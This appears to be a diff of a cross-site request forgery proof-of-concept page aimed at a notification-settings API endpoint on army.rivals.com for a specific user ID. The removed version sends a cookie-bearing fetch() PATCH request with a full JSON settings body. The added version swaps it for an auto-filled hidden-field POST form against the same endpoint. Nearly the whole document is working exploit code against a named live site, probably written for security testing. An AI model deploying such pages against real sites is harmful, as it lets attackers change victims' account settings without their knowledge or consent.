@@ -1,59 +1,13 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>CSRF PATCH PoC</title>
-  <style>
-    body { font-family: Arial, sans-serif; padding: 1rem; }
-    pre { background: #f0f0f0; padding: 1rem; border-radius: 6px; max-height: 200px; overflow: auto; }
-    button { padding: 0.5rem 1rem; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
-    button:hover { background: #0056b3; }
-  </style>
-</head>
 <body>
-
-<h1>CSRF PATCH Request PoC</h1>
-<p>This will send a <code>PATCH</code> request to <code>https://army.rivals.com/api/v2/users/notification_settings/3300535</code> with your current cookies.</p>
-
-<button id="send">Send PATCH request</button>
-<h2>Server Response:</h2>
-<pre id="output">No request sent yet.</pre>
-
-<script>
-document.getElementById('send').addEventListener('click', function() {
-  const output = document.getElementById('output');
-  output.textContent = 'Sending request...';
-  
-  fetch('https://army.rivals.com/api/v2/users/notification_settings/3300535', {
-    method: 'PATCH',
-    credentials: 'include',
-    headers: {
-      'Content-Type': 'application/json'
-    },
-    body: JSON.stringify({
-      id: 3300535,
-      user_id: 3309214,
-      enabled: true,
-      breaking: false,
-      commit: true,
-      commit_alert: true,
-      content: false,
-      content_alert: false,
-      forum: true,
-      transfer: false,
-      transfer_alert: false
-    })
-  })
-  .then(res => res.text().then(body => ({status: res.status, ok: res.ok, body})))
-  .then(result => {
-    output.innerHTML = result.ok
-      ? '<span style="color: green;">Success (' + result.status + ')</span>\n' + result.body
-      : '<span style="color: red;">Error (' + result.status + ')</span>\n' + result.body;
-  })
-  .catch(err => {
-    output.innerHTML = '<span style="color: red;">Error: ' + err.message + '</span>';
-  });
-});
-</script>
-
+<h1>CSRF PoC</h1>
+<form action="https://army.rivals.com/api/v2/users/notification_settings/3300535" method="POST">
+  <input type="hidden" name="id" value="3300535">
+  <input type="hidden" name="user_id" value="3309214">
+  <input type="hidden" name="enabled" value="true">
+  <!-- add other fields as needed -->
+  <button type="submit">Submit CSRF</button>
+</form>
 </body>
 </html>
